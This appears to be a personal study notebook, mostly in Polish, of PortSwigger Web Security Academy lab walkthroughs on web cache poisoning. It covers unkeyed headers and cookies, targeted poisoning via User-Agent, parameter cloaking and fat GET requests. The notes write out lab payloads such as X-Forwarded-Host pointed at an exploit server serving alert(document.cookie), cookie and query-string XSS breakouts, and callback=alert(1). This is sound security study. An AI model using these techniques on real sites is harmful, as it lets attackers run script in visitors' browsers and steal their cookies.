first test:
miss - hit (cachowanie działa)
(poprawnie znaleziony cache key)
<hr>

param miner:
nowe cache buster in cachekey (GET /?cb=1)
cache: miss
 
 <hr>
 
 Żądania GET
 <br>
Tak, żądania GET są zwykle cache’owane.
Powód: GET jest idempotentny (czyli nie zmienia stanu serwera).
Cache (przeglądarka, CDN, reverse proxy) może zapamiętać odpowiedź GET i podawać ją kolejnym użytkownikom, jeśli nagłówki i polityka cache na to pozwalają (Cache-Control, Expires).

 <br><br>

Żądania POST
 <br>
Nie, żądań POST zwykle się nie cache’uje.
Powód: POST jest niemal zawsze używany do zmiany stanu serwera (np. wysłanie formularza, dodanie rekordu do bazy).
Cache nie powinien zwracać zapisanej odpowiedzi POST, bo każdy POST może dawać inną odpowiedź w zależności od danych przesyłanych w ciele żądania.

 <br><br>

Zmanipulowane cache
<br>
<img width="737" height="191" alt="image" src="https://github.com/user-attachments/assets/330dc2a1-dfed-4e77-9187-87924fe9c3dd" />


zapobieganie
<br>
Even if you do need to use caching, restricting it to purely static responses is also effective, provided you are sufficiently wary about what you class as "static". For instance, make sure that an attacker can't trick the back-end server into retrieving their malicious version of a static resource instead of the genuine one.

  <br><br>

Nawet jeśli musisz używać cache (pamięci podręcznej), np. dla wydajności, ograniczenie cache tylko do statycznych zasobów (np. obrazki, pliki CSS, JavaScript, które się nie zmieniają dynamicznie) jest skuteczne. Innymi słowy: nie cache’uj dynamicznych stron generowanych indywidualnie dla użytkowników (np. dashboard, koszyk w sklepie, strony z danymi konta), bo to zwiększa ryzyko web cache poisoning. Ważne jest, żeby dokładnie wiedzieć, co naprawdę jest statyczne. Nie wszystko, co wygląda na stałe, musi nim być – np. plik z URL-em /script.js?v=123 może być dynamicznie generowany przez serwer. Trzeba upewnić się, że atakujący nie może wprowadzić własnej, złośliwej wersji pliku, którą serwer potem zapisze w cache zamiast prawdziwego pliku. Przykład: atakujący podmienia URL lub nagłówek w żądaniu, serwer traktuje to jako „statyczny zasób” i zapisuje jego wersję w cache → wszyscy użytkownicy dostają złośliwą wersję.

  <br><br>

https://portswigger.net/research/practical-web-cache-poisoning

   <br><br>
<hr> <br><br>
<h2>Lab: Web cache poisoning with an unkeyed header</h2>

 <br>

unkeyed input – ryzyko web cache poisoning

Unkeyed input to dane, które wpływają na odpowiedź serwera, ale nie są brane pod uwagę przy tworzeniu klucza cache, przez co mogą powodować błędy w przechowywaniu i zwracaniu odpowiedzi.

  <br>

1.original request 2x 
Miss (response nie znajduje w cache) 
Hit (response już jest w cache) 

 <br>
 
2./?cb=kasia123  
Cache: Miss 
param min> guest headers 

 <br>

3.wynik w target > sitemap> issues 

x-forwarded-host header is an unkeyed header 

 <br>

4./?cb=kasia123 
X-Forwarded-Host: wartość URL exploit serwera 


„Hej, traktuj exploit-server.com jako host tej aplikacji.” 

Bo Nagłówek X-Forwarded-Host jest używany głównie przez: reverse proxy, load balancer, CDN 

X-Forwarded-Host wskazuje oryginalny host (domenę), którego użył klient, zanim request przeszedł przez proxy / load balancer / CDN.
 
  <br>

5.Aplikacja używa wartości xfh do zbudowania adresu w script src.
exploi server odbity w body. Kopiujemy zasob, który jest dalej.


Jest uzyty przez .js tracking file

/resources/js/tracking.js 

  <br>

6.Wklejamy w exploit server, <br>

file: /resources/js/tracking.js 
body: alert(document.cookie); 
 <br>
Store 
 
 <br>
 
7.wysalc jeszcze to samo żądanie, aż będzie cache hit. 

  <br>

8.w przeglądarce doklejamy do strony głównej 

/?cb=kasia123

i mamy popup 

  <br>

9.dystrybuujemy atak do strony głównej 
W request zostawiamy / i wysyłamy dwa razy 
(kasuejmy /?cb=kasia123) 
 
 <br>
 ad.2
 <img width="1192" height="515" alt="image" src="https://github.com/user-attachments/assets/ec209564-4602-433a-9de5-226f535d0885" />
 
<img width="908" height="389" alt="image" src="https://github.com/user-attachments/assets/d1afe6cf-0c16-4a7a-a77b-c79f2c6e7602" />

<br><br>
 ad3.<br>

 <img width="1003" height="625" alt="image" src="https://github.com/user-attachments/assets/92dc8e00-ad0f-4c37-9dbc-beefc3cf928e" />
<br><br>
ad4.<br>

<img width="1197" height="642" alt="image" src="https://github.com/user-attachments/assets/844f7bf4-b491-479c-94a2-410c23aea46b" />
<br><br>

<img width="841" height="606" alt="image" src="https://github.com/user-attachments/assets/b8412e31-bd8d-422e-916b-de9013784ff6" />

<br><br>
<img width="1470" height="647" alt="image" src="https://github.com/user-attachments/assets/bc0635af-a6e6-4fbe-bd1a-3d62a9b869e5" />
<br><br>

<img width="1487" height="744" alt="image" src="https://github.com/user-attachments/assets/260d9a15-b91e-47c4-8c26-fd6e34009a61" />



Atakujący wysyła do serwera żądanie z nagłówkiem X-Forwarded-Host, ustawionym na swoją złośliwą domenę.
Serwer ufa temu nagłówkowi i generuje stronę HTML, w której umieszcza link do skryptu z tej złośliwej domeny.
Cache zapisuje tę wygenerowaną stronę jako normalną wersję strony głównej, ponieważ nie bierze pod uwagę nagłówka X-Forwarded-Host przy tworzeniu klucza cache.
Gdy zwykły użytkownik wejdzie na stronę główną, dostaje z cache zatrutą wersję HTML.
Jego przeglądarka ładuje złośliwy skrypt z serwera atakującego, a ten skrypt wykonuje się w kontekście strony i może odczytać document.cookie.

<br><br>
<hr>
<br><br>
<h2>Lab: Web cache poisoning with an unkeyed cookie </h2>
 
 <br>

Cookies aren't included in the cache key! Mogę je zmieniać i cały czas jest hit. 
 
1.Check / request 
Cache-Control: max-age=30 - może być cache’owana przez 30 sekund,
Age: 1 - aktualnie ma 1 sekundę, 
X-Cache: hit – jest w cache

<br>

2.Cache- buster GET     > part of cache key
/?cb=kasia123 miss hit

  <br>

Miss-hit pojawia się tylko po alteracji GET, 
po zmianie ciasteczka feshost, zawsze jest hithit

It means, this is GET query string is a part of cache key 
Use this as a part of CB, not to not impack other users visiting / page that we are probing, and to test fresh uncached requests 

<br>

3.fing unkeyed input: long story short: param>guess cookie z cache buster w GET > MI SKAN NIE DZIAŁA
Cookie: session=9gmLxSJpmBeVw8WVG6uWluicMVmP4Cga; fehost=prod-cache-01 
prod-cache-01 jest odbite już w odpowiedzi, wiec jest to ważne zrodlo umieszczenia js

fehost=prod-cache-03

<script>  data = {"host":"0a0a007c030ae19c80036c210097001a.web-security-academy.net","path":"/","frontend":"prod-cache-03"} </script> ```
 
 <br>
 
4.fehost robimy pusty  
fehost= 

"frontend":""

 <br> 
 
5.final payload

fehost
"-alert(1)-"

```<script> data = {"host":"0ac5004b043c07b180c23a8a007d00de.web-security-academy.net","path":"/","frontend":""-alert(1)-""} </script>```



<img width="1128" height="552" alt="image" src="https://github.com/user-attachments/assets/3bf7006e-b706-4bb9-8c83-a7f30a53b3a0" />

<br><br>

<img width="1204" height="522" alt="image" src="https://github.com/user-attachments/assets/8e9f2cb0-2f5e-4182-9910-a49e878a9402" />



(musi być hit w odpowiedzi, żeby się zapisało w cache):


<img width="1235" height="537" alt="image" src="https://github.com/user-attachments/assets/1fcd3e39-90a7-4a2b-bd1b-93f7b424b2c9" />

  
  <br>
  <hr>
  <br> 

<h2>Lab: Web cache poisoning with multiple headers </h2>
 <br>
notes:

X-Forwarded-Scheme is an HTTP request header used to identify the original protocol (HTTP or HTTPS) a client used to connect to a proxy or load balancer.

<br>

Long story short:

Aplikacja ma dwa ukryte nagłówki. Drugi wyszukujemy dopiero jak wprowadzimy do żądania pierwszy wykryty.
Nagłówek X-Forwarded-Scheme jeśli ma wartość inną niż https, powoduje redirect do tracking cooki, zaciągając do Location host z X-Forwarded-Host.
Będąc w GET /resources wprowadzamy X-Forwarded-Scheme:http i X-Forwarded-Host: exploit server.
W explot server poprawnie uzupełniamy file i body. Store.
Cachujemy ww. GET póki nie będzie hit.
Odświeżamy stronę główną. Vuala.

test cache miss hit 

param miner 1st > insert new header
param miner 2nd

new /?cb=6
X-Forwarded-Host: exploit-0a11008604ffa19d80ac4d970137004d.exploit-server.net
body exploit server:
alert(document.cookie);
file: resources path
browsre lab/?cb=6

<br>

GET change to /resources path

<hr>
<img width="1201" height="484" alt="image" src="https://github.com/user-attachments/assets/93669f29-caed-4193-868a-fd56bd9295ea" />

<br><br>

<img width="1196" height="341" alt="image" src="https://github.com/user-attachments/assets/9e45d7bb-906f-4d90-bbf7-1e3bb6e2b54f" />

<br><br>

<img width="989" height="667" alt="image" src="https://github.com/user-attachments/assets/5665f3d9-7f5c-483c-882b-9d2e6f1c3540" />

<br><br>

<img width="1166" height="605" alt="image" src="https://github.com/user-attachments/assets/33589442-b29a-4c07-be24-e3a8c3eaa86c" />

<br><br>

<img width="1118" height="599" alt="image" src="https://github.com/user-attachments/assets/d92d2aa7-3c76-4b0f-b454-7dbc11ad35fc" />

<br><br>

<img width="1112" height="547" alt="image" src="https://github.com/user-attachments/assets/d2bc9d60-aa35-4c17-a71b-4a83f7091bc4" />

<br><br>

<img width="986" height="518" alt="image" src="https://github.com/user-attachments/assets/2a005ad4-65e7-46c7-b9f1-5e93d142b414" />

<br><br>

<img width="1155" height="364" alt="image" src="https://github.com/user-attachments/assets/376b2b2e-567e-4119-a7b4-ed1e81f07ca8" />

<br><br>

<img width="1118" height="383" alt="image" src="https://github.com/user-attachments/assets/29e75538-0d17-4746-aafa-bf1e7460d1d7" />

<br><br>

<img width="1137" height="702" alt="image" src="https://github.com/user-attachments/assets/df87cc51-24e8-44d5-bed0-241bd7493179" />

<br><br>

<img width="1544" height="659" alt="image" src="https://github.com/user-attachments/assets/cf787832-c286-4fcf-9ab6-76f466a8dbe3" />

<br><br>
<hr>
<br><br>
<h2>Lab: Targeted web cache poisoning using an unknown header</h2>

You need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 
Target users: Należy jednak upewnić się, że odpowiedź zostanie wysłana do konkretnej grupy użytkowników, do której należy dana ofiara. (via USER AGENT)

GET /cb=1
resp: miss
param miner > guess header
x-host:

CACHE KEY HERE: 
REQUEST METHOD & IT'S VALUE (/path/in/GET) & USER AGENT 
(VARY:USER AGENT)

Vary to nagłówek odpowiedzi HTTP, który mówi cache:
„Ta odpowiedź zależy od konkretnego nagłówka z requestu — jeśli on się zmieni, stwórz nowe cache.”

X-host: malicioussource.io
Serwer w odpowiedzi HTML wskazuje na złośliwy host, a przeglądarka ten plik pobierze

<br><br>

<img width="1196" height="560" alt="image" src="https://github.com/user-attachments/assets/2fe8b478-0c9c-40a8-a70b-aee9332cab48" />

<br><br>

<img width="1246" height="526" alt="image" src="https://github.com/user-attachments/assets/86528f0d-9c80-49e9-acb3-970e072552a8" />

<br><br>

<img width="1487" height="748" alt="image" src="https://github.com/user-attachments/assets/d7be2c91-0389-401c-8f74-9fb9f88b6037" />

<br><br>

Veryfing victim browser 

<br><br>

<img width="1015" height="623" alt="image" src="https://github.com/user-attachments/assets/d8fa6a9e-4dcc-4f3f-b5a0-88c2604536a4" />

<br><br>

<img width="1145" height="584" alt="image" src="https://github.com/user-attachments/assets/1b8111a9-e915-4b09-834f-f007ea0247c3" />

<br><br>

<img width="1180" height="538" alt="image" src="https://github.com/user-attachments/assets/d8d46640-01eb-408e-bd7b-37dd8b75f271" />



<br><br>
<hr>
<br><br>
<h2>Lab: Web cache poisoning via an unkeyed query string</h2>

A user regularly visits this site's home page using Chrome. 

Query string to część adresu URL po znaku ?, która przekazuje dodatkowe dane do serwera.
Przykład: https://example.com/search?q=buty&color=black

<img width="1192" height="570" alt="image" src="https://github.com/user-attachments/assets/914bcc19-894f-4b76-ab3c-f0f9f5a8284c" />


<br><br>

nie cachuje się query string, miss pojawia się dopiero przy age: 35 (czyli po upływie max age)

<br><br>

<img width="963" height="241" alt="image" src="https://github.com/user-attachments/assets/8e8fbf36-bb3f-4aaa-a390-d57ecf95688e" />

<br><br>

<img width="1186" height="469" alt="image" src="https://github.com/user-attachments/assets/ec9fb205-9f80-41d5-88c9-dcf32d0e49de" />

<br><br>

/?cb=T'/><script>alert(1)</script>


<br><br>
<hr>
<br><br>
<h2>Lab: Web cache poisoning via an unkeyed query parameter</h2>

This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.
To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser.
Hint: Websites often exclude certain UTM analytics parameters from the cache key.

guess everything!

<img width="854" height="398" alt="image" src="https://github.com/user-attachments/assets/f27d6aa0-d220-4e98-81e5-1d17aee1dd68" />

<img width="968" height="582" alt="image" src="https://github.com/user-attachments/assets/b601b4e6-1d6c-4dfb-812b-85be695e865e" />

UTM to parametry w URL do analityki marketingowej — nie mają wpływu na działanie strony, tylko na śledzenie ruchu.
utm_source - źródło ruchu (np. facebook, google)
utm_medium - typ kanału marketingowego (np. cpc, email)
utm_campaign - nazwa kampanii marketingowej
utm_term - słowo kluczowe reklamy
utm_content - wersja lub wariant reklamy

<img width="1215" height="516" alt="image" src="https://github.com/user-attachments/assets/4541392e-1cd3-499b-b52f-f49befced363" />

browser: zasób /

<br><br>
<hr>
<br><br>
<h2>Lab: Parameter cloaking</h2>

for cache server theres two parameters and ony one is cache key

<img width="1380" height="340" alt="image" src="https://github.com/user-attachments/assets/dcc08194-2f81-4d2f-aeba-7603b91909f4" />

for web server it could be 1 parameter

<img width="604" height="188" alt="image" src="https://github.com/user-attachments/assets/61ec4232-b594-46d4-bcc4-dc686f953134" />

for specific frameworks like ruby on rails. ruby supports two delimiter special characters: & and ;

<img width="816" height="173" alt="image" src="https://github.com/user-attachments/assets/808a601a-2999-417a-8c80-cb567a74a2e2" />

<img width="783" height="162" alt="image" src="https://github.com/user-attachments/assets/0328ea5e-aa45-423e-8d98-0d437b73a9b6" />

<img width="971" height="74" alt="image" src="https://github.com/user-attachments/assets/3dd1cca3-53e1-4047-be28-00275c7551d5" />

rail param cloaking scan

<img width="1129" height="672" alt="image" src="https://github.com/user-attachments/assets/55cd2b31-e799-4d51-ae8c-085777c0a3c9" />

cache key

<img width="1164" height="597" alt="image" src="https://github.com/user-attachments/assets/cf8357ce-56bc-49d9-a0cd-58a139d35232" />

after param miner

<img width="1029" height="464" alt="image" src="https://github.com/user-attachments/assets/10193cef-943b-4249-bc5e-51d4b4408d25" />

solved

<img width="1110" height="457" alt="image" src="https://github.com/user-attachments/assets/234ef890-91b3-42de-9a29-9b690d3351c9" />


*** MY WALKTHROUGH ***

<img width="1188" height="443" alt="image" src="https://github.com/user-attachments/assets/442f5ab5-fb73-4c25-8d3b-5427b9bcce85" />

not work:
<img width="1113" height="522" alt="image" src="https://github.com/user-attachments/assets/77cea944-177a-435b-bafb-09bf98d7f2c1" />


GET

/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction

/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)

 

Cookie: United Kingdom

<br><br>
<hr>
<br><br>
<h2>Lab: Web cache poisoning via a fat GET request</h2>

Ten endpoint nie okłada mi się w burp, ale widzę go w network

<img width="640" height="678" alt="image" src="https://github.com/user-attachments/assets/6f1972d0-2a5d-48b0-96f6-4a385ec61aad" />

<img width="724" height="271" alt="image" src="https://github.com/user-attachments/assets/02f8030c-ad09-414b-b359-736367b4cb6c" />

Odbicie wartości z GET query w body response

<img width="943" height="616" alt="image" src="https://github.com/user-attachments/assets/9939ebbc-2b7c-4343-8664-b6ab58656596" />

Trying parameter cloaking

/js/geolocate.js?callback=value1&param2=value2;param3=value3

<img width="931" height="628" alt="image" src="https://github.com/user-attachments/assets/e896e79d-0d9f-4ca9-b2eb-44b0a7b0d8ae" />

I co jeśli zamienimy parametr3 na parametr1(czyli znów callback)

/js/geolocate.js?callback=value1&param2=value2;callback=value3

Brak zmian

<img width="936" height="568" alt="image" src="https://github.com/user-attachments/assets/d7ebddbe-7026-45a8-8442-e62f9e78be8e" />

Zaznaczamy tylko ten fragment /js/geolocate.js? i skanujemy param miner > fat GET 

Fat GET = GET z body

Ale nie możemy zmienić methody na POST bo w post nie ma nagówków Cachowania po stronie serwera.

<img width="1209" height="715" alt="image" src="https://github.com/user-attachments/assets/731a3e5e-66d4-4b90-a7f3-6f906d62f8fa" />

Dodajemy do oryginalnego requestu skryptu geolokacji nagłówek i body ze skanu

<img width="1090" height="709" alt="image" src="https://github.com/user-attachments/assets/ebe911ff-84dd-4a99-bb8b-25471bda3d74" />


<br><br>
<hr>
<br><br>
<h2>Lab: Web cache poisoning via a fat GET request</h2>

Browser URL encoding:

<script>

%3cscript%3e


In the scan we choose normalize path bo nie mamy w GET żadnego query i parameter.

<img width="876" height="718" alt="image" src="https://github.com/user-attachments/assets/89b7d7d2-7acf-4efa-b882-1d0c411789d2" />

Wybieram request gdzie odpowiedz jej 404

<img width="673" height="522" alt="image" src="https://github.com/user-attachments/assets/d0acb398-2b6f-4465-b4a2-b955a3629096" />

<img width="939" height="439" alt="image" src="https://github.com/user-attachments/assets/c9486694-12d3-4763-9d85-ee09d341e764" />

Payload > cache miss-hit> ppm > copy url > deliver to the victim

 

Payload GET /random</p><script>alert(1)</script><p>foo

Zamienia się na URL encoded po odświeżeniu strony w przeglądarce chyba czasem, albo randomowo. Ale nie potrzeba url encoded odpowiedzi, żeby zaliczyć.

 <img width="1018" height="586" alt="image" src="https://github.com/user-attachments/assets/7bebbcd2-afbc-41d1-80b0-af2c7484accd" />
